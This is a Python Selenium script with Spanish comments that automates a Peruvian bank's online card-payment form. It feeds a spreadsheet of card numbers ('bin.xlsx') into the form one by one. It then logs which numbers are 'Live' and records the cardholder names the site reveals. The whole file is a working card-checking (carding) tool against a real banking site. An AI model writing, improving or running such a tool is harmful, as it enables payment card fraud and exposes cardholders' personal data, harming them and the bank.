import pandas
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.common.exceptions import WebDriverException
from os import system


#excel_credenciales = r'G:\.Programacion\Pyhton\Automatizacionbot\BCP nombres\bin.xlsx'
excel_credenciales = "./bin.xlsx"

df = pandas.read_excel(excel_credenciales,sheet_name='Hoja1')

url = 'https://bcpzonasegurabeta.viabcp.com/'

#Paths
path_ingresar ='/html/body/nhbk-root/nhbk-login/div[1]/div[1]/div/div[2]/form/div[3]/nhbk-card-number/div/div[1]/div/input'
path_tarjeta = '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[5]/div/nhbk-text-box/div/input'
botonerror = '/html/body/modal-container/div/div/nhbk-confirmation-modal/div/nhbk-modal-footer/div/button'
cuadronombre ='/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[6]/nhbk-inmediate-pay/div/div/p[2]'
nombrexpath = '//*[@id="wrapper"]/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[6]/nhbk-inmediate-pay/div/div/p[2]'
boton_gmail= '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[7]/div/div/nhbk-text-box/div/input'
botonsaldo= '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[2]/div[2]/nhbk-text-box/div/input'
boton_aceptar = '/html/body/modal-container/div/div/nhbk-confirmation-modal/div/nhbk-modal-footer/div/button'
mensajeError = '/html/body/modal-container/div/div/nhbk-confirmation-modal/div/nhbk-modal-body/div/div/p'
#Abriendo el navegador
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
driver = webdriver.Chrome(chrome_options=chrome_options)
driver.get(url)
time.sleep(4)
system("cls")

		#Menu para loguearme:
#Registrando tarjeta 
'''cc_person = input("Escribe tu tarjeta: ")
wait = WebDriverWait(driver,10)
wait.until(ec.visibility_of_element_located((By.XPATH,path_ingresar)))
driver.find_element_by_xpath(path_ingresar).send_keys(cc_person)'''

redirect = input("\033[3;32m" + " Escriba 1 si ya esta logueadooo: "+ "\033[0;m" )

if (redirect == "1" ):
	driver.get("https://bcpzonasegurabeta.viabcp.com/#/portal/pago-de-tarjetas/otro-banco-financiera/completa-los-datos-para-tu-pago")

time.sleep(2)
redirect2 = input("\033[3;32m" +" Escriba 2 si ya termino de cuadrar el menu:  "+ "\033[0;m")
if (redirect2 == "2" ):
	print("\n")


#Abriendo archivo tesxt
log = open("log.txt","a")
lives = open("lives.txt","a")
#print("¡¡¡Corre!!!")
#Menú entrado
import pyttsx3
engine = pyttsx3.init()
engine.setProperty("rate",150)
text = "Iniciando programa, recuerde no minimizar"
engine.say(text)
engine.runAndWait()
print("La velocidad depende de tu internet")
try:
	for i in df.index:
		tarjetas=str(df['tarjetas'][i])
		#metiendo laa tarjeta

		driver.find_element_by_xpath(path_tarjeta).clear()
		driver.find_element_by_xpath(path_tarjeta).send_keys(tarjetas)
		#print(tarjetas)
		#time.sleep(1)
		#print("Clicleando boton saldo")
		driver.find_element_by_xpath(botonsaldo).click()
		#Esperando la pantalla de carga
		#Abriendo archivo
		#archivo = open("archivo.txt","w")
		try:
			#print("Intentando Loop")
			wait = WebDriverWait(driver,15)
			wait.until(ec.visibility_of_element_located((By.XPATH,boton_aceptar)))
			errormsj = driver.find_element_by_xpath(mensajeError).text
			print("\033[4;31m" + tarjetas,"  ---- > " , errormsj  + "\033[0;m" )
			log.write(errormsj)
			log.write("\n")
			#archivo.close()
			#print('-----')
			#time.sleep(5)
			#print("Clicleando boton aceptar ")
			driver.find_element_by_xpath(boton_aceptar).click()
		except:
			datos = driver.find_element_by_xpath(nombrexpath).text
			#print(datos) # LiVE!!!!!
			print("\033[3;32m" + tarjetas,"  ---- >  Live" + "\033[0;m" )
			log.write(datos) #Escribiendo los nombres en el block
			lives.write(tarjetas) # Escribiendo las lives en el block
			lives.write("\n")
			log.write("\n")

			#archivo.close()	
		#print ("Loop!")
		#time.sleep(1)
except Exception as e:
	print('----------')
	print('----------')
	text = "Error en el programa, vuelva a intentarlo"
	engine.say(text)
	engine.runAndWait()

print("Programa finalizado")
fin = "Programa finalizado!!!"
engine.say(fin)
engine.say(fin)
engine.runAndWait()
#engine.say(fin)

lives.close()
log.close()
time.sleep(10)
driver.close()


